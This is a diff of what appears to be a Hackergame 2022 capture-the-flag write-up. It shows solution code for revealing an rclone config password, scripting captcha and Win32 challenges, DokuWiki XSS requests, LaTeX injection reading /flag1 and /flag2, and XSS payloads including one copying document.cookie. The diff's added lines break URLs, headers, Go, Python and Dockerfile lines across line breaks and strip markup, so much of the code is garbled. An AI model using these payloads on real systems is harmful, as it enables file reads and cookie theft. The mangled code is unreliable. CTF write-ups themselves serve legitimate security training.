@@ -24,22 +24,12 @@ java免杀合集
 
 ```
 grep flag{ . -aR
-```
-
-
-
-```
 .config/rclone/rclone.conf
 [flag2]
 type = ftp
 host = ftp.example.com
 user = user
 pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
-```
-
-
-
-```
 // Package obscure contains the Obscure and Reveal commands
 // package obscure
 package main
@@ -91,7 +81,8 @@ func crypt(out, in, iv []byte) error {
 func Obscure(x string) (string, error) {
     plaintext := []byte(x)
     ciphertext := make([]byte, aes.BlockSize+len(plaintext))
-    iv := ciphertext[:aes.BlockSize]
+    iv := ciphertext[:
+aes.BlockSize]
     if _, err := io.ReadFull(cryptRand, iv); err != nil {
         return "", fmt.Errorf("failed to read iv: %w", err)
     }
@@ -120,7 +111,8 @@ func Reveal(x string) (string, error) {
         return "", errors.New("input too short when revealing password - is it obscured?")
     }
     buf := ciphertext[aes.BlockSize:]
-    iv := ciphertext[:aes.BlockSize]
+    iv := ciphertext[:
+aes.BlockSize]
     if err := crypt(buf, buf, iv); err != nil {
         return "", fmt.Errorf("decrypt failed when revealing password - is it obscured?: %w", err)
     }
@@ -141,11 +133,6 @@ func main() {
 }
 # go run exp.go
 flag{get_rclone_password_from_config!_2oi3dz1} <nil>
-```
-
-
-
-```
 # rclone reveal
 Usage:
   rclone reveal password [flags]
@@ -159,11 +146,6 @@ Use "rclone help backends" for a list of supported services.
 Command reveal needs 1 arguments minimum: you provided 0 non flag arguments: []
 # rclone reveal tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
 flag{get_rclone_password_from_config!_2oi3dz1}
-```
-
-
-
-```
 #!/usr/bin/env python3
 from hashlib import sha256
 
@@ -189,11 +171,6 @@ def get_flag(a):
 
 if __name__ == "__main__":
     get_flag(a)
-```
-
-
-
-```
 #!/usr/bin/env python3
 import re
 from hashlib import sha256
@@ -227,20 +204,17 @@ def get_flag(a):
 if __name__ == "__main__":
     get_flag(a)
 # Tha flag is: flag{6d9ad6e9a6268d96-ba7e80b7a7fa0224}
-```
-
-
-
-```
 import requests
 import re
 
 s = requests.Session()
-r = s.get("http://202.38.93.111:10047/xcaptcha?token=xxxx")
+r = s.get("http://202.38.93.111:
+10047/xcaptcha?token=xxxx")
 print(r.status_code)
 print(r.text)
 
-r = s.get("http://202.38.93.111:10047/xcaptcha").text
+r = s.get("http://202.38.93.111:
+10047/xcaptcha").text
 print(r)
 
 data = re.findall(r'<label for="captchad">(d+)+(d+) 的', r)
@@ -251,44 +225,26 @@ print(l)
 
 post_data = dict(captcha1=l[0], captcha2=l[1], captcha3=l[2])
 print(post_data)
-r = s.post("http://202.38.93.111:10047/xcaptcha", data=post_data).text
+r = s.post("http://202.38.93.111:
+10047/xcaptcha", data=post_data).text
 
 # post_data = f"captcha1={l[0]}&captcha2={l[1]}&captcha3={l[2]}"
 # headers = {"Content-Type": "application/x-www-form-urlencoded"}
-# r = s.post("http://202.38.93.111:10047/xcaptcha", data=post_data, headers=headers).text
+# r = s.post("http://202.38.93.111:
+10047/xcaptcha", data=post_data, headers=headers).text
 
 print(r)
 # flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_afd9a3e77c}
-```
-
-
-
-```
 import win32api
 import win32con
 
 hWnd = int('001E0D4C', 16)
 win32api.SendMessage(hWnd,win32con.WM_LBUTTONDOWN,0,0)
 win32api.SendMessage(hWnd,win32con.WM_LBUTTONUP,0,0)
-```
-
-
-
-```
 pip install pywin32==300
-```
-
-
-
-```
 flag{Y0u_rea1ly_kn0w_Win32API_89ab91ac0c}
-```
-
-
-
-```
-#include <windows.h>
-#include <stdio.h>
+    #include <windows.h>
+    #include <stdio.h>
 
 int main(void){
     HWND target = NULL;
@@ -305,11 +261,6 @@ int main(void){
     PostMessageW(target, 0x111, 3, 114514);
     return 0;
 }
-```
-
-
-
-```
 import win32con
 import win32gui
 hwnd = win32gui.FindWindow(None, "flag 自动机")
@@ -319,11 +270,6 @@ win32gui.SendMessage(
     win32con.BN_CLICKED << 16 | 3,  # wParam
     0x1bf52                         # lParam
 )
-```
-
-
-
-```
 float sceneSDF(vec3 p, out vec3 pColor) {
     pColor = vec3(1.0, 1.0, 1.0);
 
@@ -339,29 +285,9 @@ float sceneSDF(vec3 p, out vec3 pColor) {
     float tmin = min(min(min(min(t1, t2), t3), t4), t5);
     return tmin;
 }
-```
-
-
-
-```
 float t5 = t5SDF(vec3(36.0, 10.0, 15.0), vec3(30.0, 5.0, 5.0), 2.0);
-```
-
-
-
-```
 flag{SDF-i3-FuN!}
-```
-
-
-
-```
 flag{8_1ayER_rogeRS_81ind_V1a}
-```
-
-
-
-```
 POST /doku.php?id=start HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Cookie: PHPSESSID=5nlriqummcitbeg1fgjl3t5cuu; session=xxxxxxxxx; DOKU_PREFS=list%23thumbs
@@ -369,73 +295,42 @@ Content-Length: 120
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate,br
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
-Host: 202.38.93.111:15004
+Host: 202.38.93.111:
+15004
 Connection: Keep-alive
 
 difftype=sidebyside'"()%26%25<zzz><ScRiPt%20>alert(00)</ScRiPt>&do=diff&do[diff]=1&id=start&rev2[0]=0&rev2[1]=0&sectok=1
-```
-
-
-
-```
 POST /doku.php?id=start HTTP/1.1
-Host: 202.38.93.111:15004
+Host: 202.38.93.111:
+15004
 Content-Length: 90
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://202.38.93.111:15004
+Origin: http://202.38.93.111:
+15004
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://202.38.93.111:15004/doku.php?id=start
+Referer: http://202.38.93.111:
+15004/doku.php?id=start
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
 sectok=&id=start&do=diff&difftype=sidebyside&rev2%5B1%5D=1666320802&rev2%5B0%5D=1665224461
-```
-
-
-
-```
 flag{d1gandFInD_d0kuw1k1_unexpectEd_API}
-```
-
-
-
-```
 documentclass[preview]{standalone}
 begin{document}
 $$
 $$
 end{document}
-```
-
-
-
-```
 input{/flag1}
-```
-
-
-
-```
 flag{becAr3fu11dUd3a71669bc56}
-```
-
-
-
-```
 catcode `$=12
 catcode `#=12
 catcode `_=12
 catcode `&=12
 input{path_to_script.pl}
-```
-
-
-
-```
 latex_to_image_converter.sh
 #!/bin/bash
 
@@ -451,7 +346,8 @@ pdftoppm -r 300 result.pdf > result.ppm
 pnmtopng result.ppm > $1
 OMP_NUM_THREADS=1 convert $1 -trim $1
 Dockerfile
-FROM debian:bullseye-slim
+FROM debian:
+bullseye-slim
 
 # deps
 RUN sed -i 's/deb.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list && 
@@ -465,37 +361,26 @@ COPY latex_to_image_converter.sh /app/
 COPY base.tex /app/
 
 CMD ["python3", "/app/server.py"]
-```
-
-
-
-```
 POST / HTTP/1.1
-Host: 202.38.93.111:10020
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Host: 202.38.93.111:
+10020
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+105.0) Gecko/20100101 Firefox/105.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 84
-Origin: http://202.38.93.111:10020
+Origin: http://202.38.93.111:
+10020
 Connection: close
-Referer: http://202.38.93.111:10020/
+Referer: http://202.38.93.111:
+10020/
 Cookie: session=xxxxxxxxxx
 Upgrade-Insecure-Requests: 1
 
 latex-text=$$input{/flag1}\catcode+`#=12\catcode+`_=12input{/flag2}$$Meow
-```
-
-
-
-```
 flag{latex_bec_0_m##es_co__#ol_7d3e6626cc}
-```
-
-
-
-```
 public String flag() {
          var prefix = System.getenv(FLAG_PREFIX);
          var input = System.getenv(FLAG_SECRET) + ":" + this.raw;
@@ -519,11 +404,11 @@ public String flag() {
          writer.writeStartElement("name");
          writer.writeCharacters(this.token.user());
          writer.writeEndElement();
-         // </name><passed>
+         // </name>
          writer.writeStartElement("passed");
          writer.writeCharacters(Integer.toString(this.passed));
          writer.writeEndElement();
-         // </passed><talented>
+         // <talented>
          writer.writeStartElement("talented");
          writer.writeCharacters(Integer.toString(this.talented));
          writer.writeEndElement();
@@ -610,37 +495,26 @@ public String flag() {
          default -> bad(exchange);
       }
    }
-```
-
-
-
-```
 POST /state HTTP/1.1
-Host: 202.38.93.111:18000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Host: 202.38.93.111:
+18000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
+105.0) Gecko/20100101 Firefox/105.0
 Accept: */*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
-Referer: http://202.38.93.111:18000/
+Referer: http://202.38.93.111:
+18000/
 authorization: Bearer xxxxxxxxxxxxxxxxxxxxxx
 Content-Type: text/plain;charset=UTF-8
 Content-Length: 33
-Origin: http://202.38.93.111:18000
+Origin: http://202.38.93.111:
+18000
 Connection: keep-alive
 Cookie: session=xxxxxxxxxxxxxx
 
 <state><guess>NaN</guess></state>
-```
-
-
-
-```
-<?xml version="1.0" ?><state><name>36</name><passed>3</passed><talented>1</talented><flag>flag{gu3ss-n0t-a-numb3r-1nst3ad-f9c5df036092eada}</flag></state>
-```
-
-
-
-```
+<?xml version="1.0" ?><state><name>36</name>3<talented>1</talented><flag>flag{gu3ss-n0t-a-numb3r-1nst3ad-f9c5df036092eada}</flag></state>
 # Copyright 2022 USTC-Hackergame
 # Copyright 2021 PKU-GeekGame
 # 
@@ -706,7 +580,8 @@ try:
         try:
             greeting = driver.execute_script(f"return document.querySelector('#greeting').textContent")
             score = driver.execute_script(f"return document.querySelector('#score').textContent")
-        except selenium.common.exceptions.JavascriptException:
+        
+except selenium.common.exceptions.JavascriptException:
             print('JavaScript Error: Did you give me correct URL?')
             exit(1)
 
@@ -720,11 +595,6 @@ except Exception as e:
     print('ERROR', type(e))
     import traceback
     traceback.print_exception(*sys.exc_info(), limit=0, file=None, chain=False)
-```
-
-
-
-```
 function click() {
 var url = window.location.href;
 var input = document.createElement('input');
@@ -750,24 +620,11 @@ const score = b64decode.substring(0, colon);
 const username = b64decode.substring(colon + 1);
 
 document.querySelector("#greeting").innerHTML = "您好，" + username + "！";
-document.querySelector("#score").innerHTML = "您在练习中获得的分数为 <b>" + score + "</b>/100。";
-```
-
-
-
-```
-100</b><img/src=1 onerror=alert(1)>:miao
-```
-
-
-
-```
-100</b><img/src=1 onerror="document.querySelector('#score').textContent=document.cookie">:miao
-```
-
-
-
-```
+document.querySelector("#score").innerHTML = "您在练习中获得的分数为 " + score + "/100。";
+100:
+miao
+100:
+miao
 flag{xS5_1OI_is_N0t_SOHARD_e3c7ac115c}
 ```
 
